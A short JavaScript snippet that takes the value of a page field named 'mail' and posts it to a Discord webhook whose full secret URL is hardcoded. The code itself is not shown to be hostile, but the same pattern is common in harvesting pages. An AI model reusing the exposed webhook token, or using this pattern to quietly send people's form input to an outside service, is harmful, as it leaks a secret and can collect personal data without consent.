var xhr = new XMLHttpRequest();
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function() {
  if(this.readyState === 4) {
    console.log(this.responseText);
  }
});


function ging() {
  var data = "username=emailUpdater&content="+document.getElementById("mail").value;
  xhr.open("POST", "https://discord.com/api/webhooks/1087713588900270120/GHiuDs3yuj3IQhcEKbDRCJbhwuj_fVSxWeLm3cCY0CFZ7h0iKfGBrsupsQW0b5BBbsui");
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

  xhr.send(data);
}
